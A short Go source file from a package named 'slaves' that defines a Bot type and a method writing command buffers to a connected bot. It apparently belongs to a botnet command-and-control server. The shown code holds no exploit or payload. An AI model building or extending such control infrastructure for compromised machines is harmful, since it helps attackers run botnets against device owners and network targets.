package slaves

import (
	"net"
)

type Bot struct {
	uid     int
	conn    net.Conn
	version byte
	source  string
}

func NewBot(conn net.Conn, version byte, source string) *Bot {
	return &Bot{-1, conn, version, source}
}

func (b *Bot) QueueBuf(buf []byte) {
	_, err := b.conn.Write(buf)
	if err != nil {
		return
	}
}
